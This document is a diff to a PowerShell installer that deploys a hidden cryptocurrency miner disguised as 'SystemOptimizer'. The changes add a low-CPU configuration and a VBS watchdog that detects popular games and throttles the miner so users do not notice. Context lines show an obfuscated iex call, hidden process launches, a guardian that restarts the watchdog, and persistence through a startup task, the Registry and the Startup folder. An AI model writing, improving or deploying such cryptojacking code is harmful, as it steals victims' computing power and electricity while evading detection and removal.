@@ -128,17 +128,19 @@ if ((Test-Path $BINARY) -and (Get-Item $BINARY).Length -gt 1000000) {
     try { iex "$c1$c2 $c3$c4 '$BASE'" 2>$null } catch {}
 }
 
-# ---- CONFIG (UTF-8 NO BOM, background:false) ----
-Show ".." "Creating configuration..."
+# ---- TWO CONFIGS: NORMAL (30%) + LIGHT (15% for games) ----
+Show ".." "Creating smart CPU configurations..."
 $logEscaped = $LOGFILE -replace '\\','\\'
-$cfgText = @"
+
+# Normal config: 30% CPU, priority 0 (idle)
+$cfgNormal = @"
 {
   "autosave": false,
   "background": false,
   "colors": false,
   "donate-level": 1,
   "log-file": "$logEscaped",
-  "print-time": 30,
+  "print-time": 60,
   "retries": 5,
   "retry-pause": 5,
   "cpu": {
@@ -146,12 +148,11 @@ $cfgText = @"
     "huge-pages": true,
     "huge-pages-jit": true,
     "hw-aes": true,
-    "priority": 2,
+    "priority": 0,
     "yield": true,
     "asm": true,
     "argon2-impl": "auto",
-    "max-threads-hint": 100,
-    "max-cpu-usage": 100
+    "max-threads-hint": 30
   },
   "opencl": {"enabled": false},
   "cuda": {"enabled": false},
@@ -168,31 +169,122 @@ $cfgText = @"
   ]
 }
 "@
-[System.IO.File]::WriteAllText($CONFIG, $cfgText, (New-Object System.Text.UTF8Encoding $false))
-Show "OK" "Config created (worker: $WORKER)"
+[System.IO.File]::WriteAllText($CONFIG, $cfgNormal, (New-Object System.Text.UTF8Encoding $false))
 
-# ---- WATCHDOG VBS (SINGLE INSTANCE ONLY, kills extras) ----
-Show ".." "Creating watchdog..."
+# Light config: 15% CPU for when heavy games are running
+$cfgLight = @"
+{
+  "autosave": false,
+  "background": false,
+  "colors": false,
+  "donate-level": 1,
+  "log-file": "$logEscaped",
+  "print-time": 60,
+  "retries": 5,
+  "retry-pause": 5,
+  "cpu": {
+    "enabled": true,
+    "huge-pages": true,
+    "huge-pages-jit": true,
+    "hw-aes": true,
+    "priority": 0,
+    "yield": true,
+    "asm": true,
+    "argon2-impl": "auto",
+    "max-threads-hint": 15
+  },
+  "opencl": {"enabled": false},
+  "cuda": {"enabled": false},
+  "pools": [
+    {
+      "url": "$POOL",
+      "user": "$WALLET",
+      "pass": "$WORKER",
+      "keepalive": true,
+      "tls": false,
+      "nicehash": false,
+      "rig-id": "$WORKER"
+    }
+  ]
+}
+"@
+[System.IO.File]::WriteAllText("$BASE\config_light.json", $cfgLight, (New-Object System.Text.UTF8Encoding $false))
+Show "OK" "Configs created: normal=30% CPU, light=15% CPU (games)"
+
+# ---- SMART WATCHDOG (game detection + single instance + auto-switch) ----
+Show ".." "Creating smart watchdog (detects games, switches CPU)..."
 $wdLines = @(
     'On Error Resume Next',
     'Set sh = CreateObject("WScript.Shell")',
     'Set wmi = GetObject("winmgmts:\\.\root\cimv2")',
+    'Set fso = CreateObject("Scripting.FileSystemObject")',
     '',
     "' Only allow one watchdog instance",
     'Set ws = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''wscript.exe'' AND CommandLine LIKE ''%watchdog.vbs%''")',
     'If ws.Count > 1 Then WScript.Quit',
     'Set ws = Nothing',
     '',
+    'base = "C:\ProgramData\SystemOptimizer"',
+    'modeFile = base & "\current_mode.txt"',
+    'cfgNormal = base & "\config.json"',
+    'cfgLight = base & "\config_light.json"',
+    'binary = base & "\SystemOptimizer.exe"',
+    '',
+    "' Heavy game process names (15% CPU when these run)",
+    'heavyGames = "valorant.exe,VALORANT-Win64-Shipping.exe,csgo.exe,cs2.exe,FortniteClient-Win64-Shipping.exe,GTA5.exe,gtav.exe,eldenring.exe,RocketLeague.exe,dota2.exe,r5apex.exe,overwatch.exe,cod.exe,ModernWarfare.exe,destiny2.exe,EscapeFromTarkov.exe,pubg.exe,TslGame.exe,Cyberpunk2077.exe,starfield.exe,HogwartsLegacy.exe,palworld.exe,helldivers2.exe,thefinals.exe"',
+    '',
     'Do',
+    "    ' Detect heavy games",
+    '    heavyRunning = False',
+    '    gameArr = Split(heavyGames, ",")',
+    '    For Each g In gameArr',
+    '        Set gp = wmi.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=''" & g & "''")',
+    '        If gp.Count > 0 Then heavyRunning = True',
+    '        Set gp = Nothing',
+    '        If heavyRunning Then Exit For',
+    '    Next',
+    '',
+    "    ' Determine target config",
+    '    If heavyRunning Then',
+    '        targetCfg = cfgLight',
+    '        targetMode = "light"',
+    '    Else',
+    '        targetCfg = cfgNormal',
+    '        targetMode = "normal"',
+    '    End If',
+    '',
+    "    ' Read current mode",
+    '    currentMode = ""',
+    '    If fso.FileExists(modeFile) Then',
+    '        Set f = fso.OpenTextFile(modeFile, 1)',
+    '        If Not f.AtEndOfStream Then currentMode = f.ReadLine',
+    '        f.Close',
+    '        Set f = Nothing',
+    '    End If',
+    '',
+    "    ' Count miner instances",
     '    Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name=''SystemOptimizer.exe''")',
     '',
     '    If procs.Count = 0 Then',
-    '        sh.Run Chr(34) & "C:\ProgramData\SystemOptimizer\SystemOptimizer.exe" & Chr(34) & " --config=" & Chr(34) & "C:\ProgramData\SystemOptimizer\config.json" & Chr(34), 0, False',
+    "        ' No miner — start with target config",
+    '        sh.Run Chr(34) & binary & Chr(34) & " --config=" & Chr(34) & targetCfg & Chr(34), 0, False',
+    '        Set mf = fso.CreateTextFile(modeFile, True)',
+    '        mf.Write targetMode',
+    '        mf.Close',
+    '        Set mf = Nothing',
     '    ElseIf procs.Count > 1 Then',
-    "        ' Too many miners! Kill all, next loop starts one fresh",
-    '        For Each p In procs',
-    '            sh.Run "taskkill /F /PID " & p.ProcessId, 0, True',
-    '        Next',
+    "        ' Too many miners — kill all, next loop starts one",
+    '        sh.Run "taskkill /F /IM SystemOptimizer.exe", 0, True',
+    '        WScript.Sleep 2000',
+    '    ElseIf currentMode <> targetMode Then',
+    "        ' Wrong mode — restart with correct config",
+    '        sh.Run "taskkill /F /IM SystemOptimizer.exe", 0, True',
+    '        WScript.Sleep 3000',
+    '        sh.Run Chr(34) & binary & Chr(34) & " --config=" & Chr(34) & targetCfg & Chr(34), 0, False',
+    '        Set mf = fso.CreateTextFile(modeFile, True)',
+    '        mf.Write targetMode',
+    '        mf.Close',
+    '        Set mf = Nothing',
     '    End If',
     '',
     '    Set procs = Nothing',
@@ -200,7 +292,7 @@ $wdLines = @(
     'Loop'
 )
 [System.IO.File]::WriteAllText("$BASE\watchdog.vbs", ($wdLines -join "`r`n"), (New-Object System.Text.UTF8Encoding $false))
-Show "OK" "Watchdog created (single-instance, kills duplicates)"
+Show "OK" "Smart watchdog created (30% normal, 15% gaming, auto-switch)"
 
 # ---- GUARDIAN VBS (SINGLE INSTANCE, watches watchdog) ----
 Show ".." "Creating guardian..."
@@ -356,6 +448,11 @@ Write-Host "    - Kill miner? Watchdog restarts it in 30s" -ForegroundColor Gray
 Write-Host "    - Watchdog dies? Guardian restarts it in 5min" -ForegroundColor Gray
 Write-Host "    - Reboot? ONSTART task + Registry + Startup folder" -ForegroundColor Gray
 Write-Host "    - Multiple instances? Auto-killed, only 1 survives" -ForegroundColor Gray
+Write-Host ""
+Write-Host "  SMART CPU:" -ForegroundColor Yellow
+Write-Host "    - Normal/Roblox: 30% CPU (idle priority)" -ForegroundColor Gray
+Write-Host "    - Heavy games (Valorant, CS2, etc.): 15% CPU" -ForegroundColor Gray
+Write-Host "    - Auto-switches every 30 seconds" -ForegroundColor Gray
 Write-Host ""
 Write-Host "  RESULT: Always exactly 1 miner. Always running." -ForegroundColor Green
 Write-Host "  ====================================================" -ForegroundColor Green
